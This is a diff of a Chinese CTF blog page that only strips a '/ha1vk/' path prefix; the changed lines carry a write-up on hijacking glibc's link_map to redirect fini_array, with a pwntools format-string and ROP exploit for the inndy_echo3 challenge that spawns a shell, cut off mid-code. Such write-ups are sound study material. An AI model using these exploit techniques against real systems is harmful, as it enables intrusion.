@@ -5,40 +5,40 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="在glibc中，当一个程序调用glibc中的exit函数时，exit函数内部会调用_dl_fini，而_dl_fini函数会调用程序中的fini_array段的函数指针去执行。查看glibc源码如下 123456789101112131415161718voidinternal_function_dl_fini (void)&#123;..........              &#x2F;* Firs">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过劫持ld中的linkmap来控制程序流">
-<meta property="og:url" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/index.html">
+<meta property="og:url" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="在glibc中，当一个程序调用glibc中的exit函数时，exit函数内部会调用_dl_fini，而_dl_fini函数会调用程序中的fini_array段的函数指针去执行。查看glibc源码如下 123456789101112131415161718voidinternal_function_dl_fini (void)&#123;..........              &#x2F;* Firs">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image6.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image7.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image8.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image9.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image10.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image11.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image12.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image2.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image3.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image4.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image5.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image6.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image7.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image8.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image9.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image10.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image11.png">
+<meta property="og:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image12.png">
 <meta property="article:published_time" content="2020-07-26T09:45:11.000Z">
 <meta property="article:modified_time" content="2025-06-26T02:20:34.177Z">
 <meta property="article:author" content="ha1vk">
@@ -48,9 +48,9 @@
 <meta property="article:tag" content="linkmap">
 <meta property="article:tag" content="dl_resolve">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/">
+<link rel="canonical" href="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/">
 
 
 <script id="page-configurations">
@@ -112,7 +112,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -133,27 +133,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -211,10 +211,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -249,7 +249,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -276,37 +276,37 @@
 
 <p>我们注意到，有一个函数指针数组的遍历调用执行。我们来看看ld.so中相应的汇编。</p>
 <p>在glibc2.23 32位ld.so里，是这样的，一个循环，直到esi为0，如果我们能够接触linkmap，就可以控制edi,esi，从而将fini_array转移到我们可以控制的地方，在可控区布下ROP。</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png" class="">
 
 <p>再来看看64位的</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image2.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image2.png" class="">
 
 <p>差不多也是这样，如果我们要做栈迁移，可以配合上一些gadget和setcontext的gadget，就可以将栈也迁移到我们可控的区域。</p>
 <p>在glibc2.29以上，这点非常有用。在glibc 2.29，setcontext内部的参数不再是rdi，而是rdx，而我们劫持free_hook时，能控制的是rdi，可以借助其他gadget完成对rdx的转移。</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image3.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image3.png" class="">
 
 <p>然后，当我们劫持了linkmap将fini_array转移到可控区以后，就不用再寻找gagdets来对rdx转移。我们看到在glibc 2.29下，其汇编是这样的</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image4.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image4.png" class="">
 
 <p>可见，rdx在第二次调用时，也指向了可控区，因此，我们结合setcontext即可在同一个可控区一次性完成布置。结合large bin attack，通过large bin attack向link_map里的l_addr写入一个堆地址，这又成为一种堆利用手法，我暂且叫他house of haivk。</p>
 <p>下面，我们用两个例题来说明其利用方式</p>
 <h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy_echo3"></a>inndy_echo3</h2><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image5.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image5.png" class="">
 
 <p>然后，我们用IDA分析一下，主函数通过alloca申请了一块随机大小的栈地址，然后传给hardfmt函数</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image6.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image6.png" class="">
 
 <p>Hardfmt里有一个非栈上的格式化字符串漏洞，可以利用5次。</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image7.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image7.png" class="">
 
 <p>由于在main里申请了随机大小的栈空间，因此hardfmt里相对栈里其他数据的距离会发生变化，因此，我们需要先拿一个固定的爆破。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   payload = <span class="string">&#x27;%8$p-%14$pEND&#x27;</span></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   _IO_2_1_stdout_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">if</span> _IO_2_1_stdout_addr &amp; <span class="number">0xFFF</span> != <span class="number">0xD60</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">&#x27;leak error&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>然后，我们就可以泄露地址，进而下一步利用。在这里，普通方法是继续利用格式化字符串，劫持栈做ROP等。这里，再介绍另一种方法，劫持linkmap里的l_addr，将fini_array转移到bss上的buff可控区内。<strong>[注意到栈里下方一个ld地址，其正好指向了linkmap里的l_addr的位置。]{.mark}</strong></p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image8.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image8.png" class="">
 
 <p>因此，我们只需利用一次格式化字符串，即可将fini_array迁移到buff里。</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image9.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image9.png" class="">
 
 <p>劫持以后，此时esi为1，意味着我们执行完这一次，不能继续执行后面的函数指针了。因此，首先利用gadgets将esi的值改大。现在edi指向我们的可控区buff，我们找到一条gadget</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改esi</span></span><br><span class="line"><span class="keyword">or</span> esi, dword ptr [edi + <span class="number">0xa</span>] ; ret</span><br></pre></td></tr></table></figure>
@@ -314,14 +314,14 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23_x86.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   payload = <span class="string">&#x27;%8$p-%14$pEND&#x27;</span></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   _IO_2_1_stdout_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">if</span> _IO_2_1_stdout_addr &amp; <span class="number">0xFFF</span> != <span class="number">0xD60</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">&#x27;leak error&#x27;</span>)</span><br><span class="line">   stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;END&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">   libc_base = _IO_2_1_stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">   <span class="comment">#or esi, dword ptr [edi + 0xa] ; ret</span></span><br><span class="line">   or_esi_p_edi_a = libc_base + <span class="number">0x001760d2</span></span><br><span class="line">   <span class="comment">#push eax ; call dword ptr [eax + 0x10]</span></span><br><span class="line">   push_eax_call = libc_base + <span class="number">0x0005d4e2</span></span><br><span class="line">   system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   gets_addr = libc_base + libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">   payload += p32(or_esi_p_edi_a)</span><br><span class="line">   payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">6</span></span><br><span class="line">   payload += p32(<span class="number">0x10</span>) <span class="comment">#使得or运算后，esi为0x10，这样就可以继续做rop了</span></span><br><span class="line">   payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2A</span></span><br><span class="line">   payload += p32(push_eax_call) <span class="comment">#gets调用完后，call [eax+0x10]处设置为system即可</span></span><br><span class="line">   payload += p32(gets_addr) <span class="comment">#先调用gets，然后eax返回了缓冲区地址</span></span><br><span class="line"></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#修改linkmap里的r_offset</span></span><br><span class="line">   payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x194</span>) + <span class="string">&#x27;c%91$n\x00&#x27;</span></span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   sh.sendline(payload)</span><br><span class="line">   payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>) + p32(system_addr)</span><br><span class="line">   <span class="comment">#raw_input()</span></span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br><span class="line">   sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">global</span> sh</span><br><span class="line">      <span class="comment">#sh = process(&#x27;./echo3&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23_x86.so&#x27;&#125;)</span></span><br><span class="line">      sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25102</span>)</span><br><span class="line">      